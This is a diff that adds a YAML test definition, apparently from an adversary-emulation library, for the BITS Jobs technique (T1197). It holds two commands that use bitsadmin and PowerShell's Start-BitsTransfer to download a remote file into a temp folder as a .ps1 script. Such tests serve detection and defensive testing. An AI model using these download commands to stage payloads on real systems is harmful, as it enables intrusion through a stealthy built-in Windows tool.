@@ -1,0 +1,28 @@
+---
+attack_technique: T1197
+display_name: BITS Jobs
+
+atomic_tests:
+- name: Download & Execute
+  description: |
+    This test simulates an adversary leveraging bitsadmin.exe to download
+    and execute a payload
+
+  supported_platforms:
+    - windows
+  input_arguments:
+  executor:
+    name: command_prompt
+    command: |
+      bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Execution/Bitsadmin.md $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
+- name: Download & Execute via PowerShell BITS
+  description: |
+    This test simulates an adversary leveraging bitsadmin.exe to download
+    and execute a payload leveraging PowerShell
+  supported_platforms:
+    - windows
+  input_arguments:
+  executor:
+    name: powershell
+    command: |
+      Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Execution/Bitsadmin.md -Destination $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
